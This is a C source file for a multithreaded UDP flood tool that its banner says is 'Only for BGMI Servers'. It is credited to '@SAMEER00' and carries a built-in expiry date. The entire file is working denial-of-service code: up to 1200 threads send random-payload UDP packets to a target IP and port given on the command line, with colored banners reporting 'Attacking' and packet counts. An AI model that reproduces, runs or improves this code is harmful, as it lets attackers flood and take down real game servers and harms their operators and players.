#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <math.h>

#define EXPIRATION_YEAR 2025
#define EXPIRATION_MONTH 06
#define EXPIRATION_DAY 26
#define DEFAULT_PACKET_SIZE 512
#define DEFAULT_THREAD_COUNT 1200

typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
} attack_params;

volatile int keep_running = 1;
volatile unsigned long total_packets_sent = 0;
volatile unsigned long long total_bytes_sent = 0;
char *global_payload = NULL;

// Function declarations
void handle_signal(int signal);
void generate_random_payload(char *payload, int size);
void *udp_flood(void *arg);
void print_disco_banner(int remaining);
void show_initial_banner();
void display_progress(time_t start_time, int duration);  // Added declaration

void handle_signal(int signal) {
    keep_running = 0;
}

void generate_random_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = (rand() % 256);
    }
}

void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;
    int sock;
    struct sockaddr_in server_addr;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    time_t end_time = time(NULL) + params->duration;
    unsigned long packets_sent_by_thread = 0;

    while (time(NULL) < end_time && keep_running) {
        sendto(sock, global_payload, params->packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        __sync_fetch_and_add(&total_packets_sent, 1);
        __sync_fetch_and_add(&total_bytes_sent, params->packet_size);
        packets_sent_by_thread++;
    }

    close(sock);
    return NULL;
}

void print_disco_banner(int remaining) {
    const char* colors[] = {
        "\033[38;2;255;0;0m", "\033[38;2;0;255;0m", "\033[38;2;0;0;255m",
        "\033[38;2;255;255;0m", "\033[38;2;255;0;255m", "\033[38;2;0;255;255m"
    };
    
    // Calculate expiry info
    time_t now = time(NULL);
    struct tm expiry_date = {0};
    expiry_date.tm_year = EXPIRATION_YEAR - 1900;
    expiry_date.tm_mon = EXPIRATION_MONTH - 1;
    expiry_date.tm_mday = EXPIRATION_DAY;
    time_t expiry_time = mktime(&expiry_date);
    double remaining_seconds = difftime(expiry_time, now);
    int expiry_days = (int)(remaining_seconds / (60 * 60 * 24));
    
    int border_color = rand() % 6;
    int text_color = rand() % 6;
    int highlight_color = rand() % 6;
    
    printf("\033[2J\033[H");
    printf("%s╔════════════════════════════════════════╗\n", colors[border_color]);
    printf("║ %s★ P O W E R F U L  ★%s ║\n", colors[text_color], colors[border_color]);
    printf("%s╠════════════════════════════════════════╣\n", colors[border_color]);
    printf("║ %s✦ Status:%s RUNNING%s              ║\n", colors[text_color], colors[highlight_color], colors[border_color]);
    printf("║ %s✦ Time Left:%s %02d:%02d%s          ║\n", colors[text_color], colors[highlight_color], remaining/60, remaining%60, colors[border_color]);
    printf("║ %s✦ Expiry Date:%s %d-%02d-%02d%s      ║\n", colors[text_color], colors[highlight_color], 
           EXPIRATION_YEAR, EXPIRATION_MONTH, EXPIRATION_DAY, colors[border_color]);
    printf("║ %s✦ Days Left:%s %d days%s           ║\n", colors[text_color], colors[highlight_color], expiry_days, colors[border_color]);
    printf("║ %s✦ Packets Sent:%s %lu%s        ║\n", colors[text_color], colors[highlight_color], total_packets_sent, colors[border_color]);
    printf("║ %s✦ Data Sent:%s %.2f MB%s      ║\n", colors[text_color], colors[highlight_color], (double)total_bytes_sent/(1024*1024), colors[border_color]);
    printf("%s╠════════════════════════════════════════╣\n", colors[border_color]);
    printf("║ %s★ POWERED BY: @SAMEER00 ★%s ║\n", colors[text_color], colors[border_color]);
    printf("%s╚════════════════════════════════════════╝\033[0m\n", colors[border_color]);
}

void display_progress(time_t start_time, int duration) {
    static time_t last_flash = 0;
    time_t now = time(NULL);
    int remaining = duration - (int)difftime(now, start_time);
    
    if (now != last_flash) {
        print_disco_banner(remaining > 0 ? remaining : 0);
        last_flash = now;
    }
    
    printf("\r\033[36m[STATUS] \033[32mAttacking | \033[33mPackets: %lu | \033[35mData: %.2f MB\033[0m", 
           total_packets_sent, (double)total_bytes_sent/(1024*1024));
    fflush(stdout);
}

void show_initial_banner() {
    // Calculate expiry info
    time_t now = time(NULL);
    struct tm expiry_date = {0};
    expiry_date.tm_year = EXPIRATION_YEAR - 1900;
    expiry_date.tm_mon = EXPIRATION_MONTH - 1;
    expiry_date.tm_mday = EXPIRATION_DAY;
    time_t expiry_time = mktime(&expiry_date);
    double remaining_seconds = difftime(expiry_time, now);
    int expiry_days = (int)(remaining_seconds / (60 * 60 * 24));

    printf("\033[2J\033[H");
    printf("\033[38;2;255;0;0m╔════════════════════════════════════════╗\n");
    printf("║ \033[1;33m★ R A J O W N E R ★ \033[38;2;255;0;0m║\n");
    printf("╠════════════════════════════════════════╣\n");
    printf("║ \033[36m✦ Author: @SAMEER00         ║\n");
    printf("║ \033[32m✦ Version: 2.0                ║\n");
    printf("║ \033[35m✦ Expiry Date: %d-%02d-%02d    ║\n", EXPIRATION_YEAR, EXPIRATION_MONTH, EXPIRATION_DAY);
    printf("║ \033[31m✦ Days Left: %d days           ║\n", expiry_days);
    printf("║ \033[33m✦ Only for BGMI Servers       ║\n");
    printf("╠════════════════════════════════════════╣\n");
    printf("║ \033[35mType './bgmi IP PORT TIME' to start\033[38;2;255;0;0m║\n");
    printf("╚════════════════════════════════════════╝\033[0m\n\n");
}

int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    srand(time(NULL));
    
    // Show banner and exit if no arguments provided
    if (argc == 1) {
        show_initial_banner();
        return 0;
    }

    // Check for minimum required arguments
    if (argc < 3) {
        show_initial_banner();
        return 0;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = (argc > 3) ? atoi(argv[3]) : 60;
    int packet_size = (argc > 4) ? atoi(argv[4]) : DEFAULT_PACKET_SIZE;
    int thread_count = (argc > 5) ? atoi(argv[5]) : DEFAULT_THREAD_COUNT;

    // Check if tool has expired
    time_t now = time(NULL);
    struct tm *local = localtime(&now);
    if (local->tm_year + 1900 > EXPIRATION_YEAR ||
        (local->tm_year + 1900 == EXPIRATION_YEAR && local->tm_mon + 1 > EXPIRATION_MONTH) ||
        (local->tm_year + 1900 == EXPIRATION_YEAR && local->tm_mon + 1 == EXPIRATION_MONTH && local->tm_mday > EXPIRATION_DAY)) {
        printf("\033[1;31mThis tool has expired. Contact @SAMEER00 for new version.\033[0m\n");
        return 1;
    }

    signal(SIGINT, handle_signal);

    global_payload = malloc(packet_size);
    if (!global_payload) {
        perror("\033[1;31mMemory allocation failed");
        return 1;
    }
    generate_random_payload(global_payload, packet_size);

    pthread_t threads[thread_count];
    attack_params params[thread_count];
    time_t start_time = time(NULL);

    for (int i = 0; i < thread_count; i++) {
        params[i].target_ip = target_ip;
        params[i].target_port = target_port;
        params[i].duration = duration;
        params[i].packet_size = packet_size;
        params[i].thread_id = i;
        pthread_create(&threads[i], NULL, udp_flood, &params[i]);
    }

    while (keep_running && time(NULL) < start_time + duration) {
        display_progress(start_time, duration);
        usleep(100000);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n\033[1;32mAttack completed successfully!\033[0m\n");
    printf("\033[1;34mFinal Stats:\033[0m\n");
    printf("  Packets Sent: \033[1;35m%lu\033[0m\n", total_packets_sent);
    printf("  Data Sent: \033[1;35m%.2f MB\033[0m\n", (double)total_bytes_sent/(1024*1024));
    
    free(global_payload);
    return 0;
}